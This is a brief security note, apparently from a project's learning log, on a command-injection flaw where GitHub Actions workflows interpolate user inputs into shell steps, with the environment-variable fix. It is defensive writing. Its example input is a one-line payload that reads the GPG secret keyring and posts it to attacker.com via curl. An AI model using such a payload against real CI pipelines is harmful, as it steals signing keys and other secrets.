## 2024-05-16 - GitHub Actions Command Injection via inputs
**Vulnerability:** Found direct string interpolation of `${{github.event.inputs.*}}` in `run:` blocks within GitHub Action workflows (`publish-commit-bottles.yml`, `dispatch-rebottle.yml`). This allowed command injection.
**Learning:** GitHub Actions evaluate `${{}}` expressions before the script is passed to the shell. A malicious input like `"; curl -X POST -d \"$(cat ~/.gnupg/secring.gpg)\" attacker.com #` could be executed.
**Prevention:** Always pass user-controlled inputs (like `github.event.inputs` or `github.event.pull_request.title`) into shell scripts using environment variables (`env:` block) and reference them as `$ENV_VAR` in the script.
